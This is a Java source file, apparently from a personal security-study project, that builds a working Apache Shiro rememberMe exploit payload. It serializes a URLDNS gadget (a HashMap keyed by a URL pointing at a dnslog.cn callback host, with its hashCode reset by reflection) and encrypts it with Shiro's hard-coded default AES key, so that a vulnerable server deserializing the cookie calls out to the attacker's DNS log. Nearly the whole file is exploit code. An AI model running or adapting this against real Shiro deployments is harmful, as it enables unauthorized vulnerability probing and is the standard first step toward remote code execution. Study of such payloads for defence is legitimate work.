package Shiro;

import org.apache.shiro.crypto.AesCipherService;
import org.apache.shiro.util.ByteSource;

import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.net.MalformedURLException;
import java.net.URL;
import java.util.HashMap;

/**
 * @BelongsProject: study_java
 * @BelongsPackage: Shiro
 * @Author: Clown
 * @CreateTime: 2023-08-06  15:54
 */
public class ShiroURLDNS {
    public static void main(String[] args) throws Exception {
        HashMap hashMap = new HashMap();
        URL url = new URL("http://ixnod8.dnslog.cn");
        Class c = url.getClass();
        Field hashcodefield = c.getDeclaredField("hashCode");
        hashcodefield.setAccessible(true);
        hashcodefield.set(url,1234);//设置hashCode值为1234
        hashMap.put(url,1);
        hashcodefield.set(url,-1);

        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
        objectOutputStream.writeObject(hashMap);
        System.out.println(byteArrayOutputStream);

        AesCipherService aesCipherService = new AesCipherService();
        byte[] key = java.util.Base64.getDecoder().decode("kPH+bIxk5D2deZiIxcaaaA==");
        ByteSource ciphertext = aesCipherService.encrypt(byteArrayOutputStream.toByteArray(), key);
        System.out.println(ciphertext.toString());
    }
}
